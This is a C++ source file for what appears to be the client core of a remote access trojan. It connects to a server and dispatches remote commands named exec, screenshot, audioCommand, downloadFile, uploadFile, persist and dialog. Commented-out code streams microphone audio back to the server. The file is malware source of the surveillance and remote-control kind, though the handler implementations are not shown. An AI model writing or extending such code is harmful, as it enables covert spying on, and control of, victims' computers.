#include "controller.h"
#include <memory>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <cstdint>
#include "controllerimpl.h"
#include "packet.h"
#include "simplepacket.h"
#include "simplecommand.h"
#include "commands.h"
using namespace std;

/**
 * Lock-free queue to hold audio data from mic.
 * Used to store data without processing it in the high-priority audio thread.
 * Flushed every so often to the server.
 */
// boost::lockfree::spsc_queue<char, boost::lockfree::capacity<8192>> audio_buf;

/**
 * Registers all commands as incoming packet types and handlers.
 */
void register_all_commands() {
	register_command(3, navigation);
	register_command(4, discordCommand);
	register_command(5, exec);
	register_command(6, screenshot);
	register_command(7, audioCommand);
	register_command(8, downloadFile);
	register_command(9, uploadFile);
	register_command(10, persist);
	register_command(11, dialog);
	register_command(12, showoff);
}

Controller::Controller(string host, uint16_t port) : impl(make_unique<ControllerImpl>()) {
	register_all_commands();
}


void Controller::run() {
	// thread audio_flush_thread(&Controller::flush_audio_buffer, this);
	while (true) {
		SerializedPacket spkt = conn->read_packet_sync();
		Packet::handle_packet(*this, *Packet::parse(spkt).get());
	}
}

void Controller::ret(uint8_t retcode) {
	SimplePacket<uint8_t> pkt(0, retcode);
	conn->write_packet_sync(pkt.serialize());
}

void Controller::print(string out) {
	SimplePacket<string> pkt(1, out);
	conn->write_packet_sync(pkt.serialize());
}

void Controller::println(string out) {
	out += "\n";
	print(out);
}

void Controller::err_println(string err) {
	SimplePacket<string> pkt(2, err);
	conn->write_packet_sync(pkt.serialize());
}

void Controller::send_buffer(const vector<uint8_t> buf) {
	SimplePacket<vector<uint8_t>> pkt(3, buf);
	conn->write_packet_sync(pkt.serialize());
}

// void Controller::flush_audio_buffer() {
// 	vector<char> bufcpy;
// 	bufcpy.resize(4096);
// 	int len = 0;
// 	while (true) {
// 		len += audio_buf.pop(&bufcpy[len], 4096 - len);
// 		if (len >= 4096) {
// 			SimplePacket<vector<char>> pkt(4, bufcpy);
// 			conn->write_packet_sync(pkt.serialize());
// 			len = 0;
// 		}
// 		this_thread::sleep_for(chrono::milliseconds(10));
// 	}
// }

// void Controller::buffer_audio(const char* buf, size_t size) {
// 	audio_buf.push(buf, size);
// }
